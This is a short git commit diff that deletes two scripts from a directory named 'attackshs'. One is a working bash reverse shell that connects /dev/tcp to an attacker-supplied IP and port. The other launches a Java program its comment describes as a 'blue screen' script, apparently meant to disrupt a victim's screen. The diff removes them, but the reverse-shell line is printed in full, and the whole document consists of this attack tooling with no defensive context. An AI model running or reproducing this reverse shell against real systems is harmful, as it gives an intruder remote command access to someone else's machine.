4d988c522ed42fcbeac9bddf313970e8cd02f19f
chuanxing <luckyton@foxmail.com>
2019-07-02 22:27:30 +0800

    version 1.2.1

--- attackshs/nclient.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-
-ip=$1
-port=$2
-
-bash -i >& /dev/tcp/${ip}/${port} 0>&1
--- attackshs/screen.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-# echo "正在执行蓝屏脚本..."
-
-dir=$(dirname $(readlink -f "$0"))
-
-/usr/bin/java -jar ${dir}/bscreen.jar
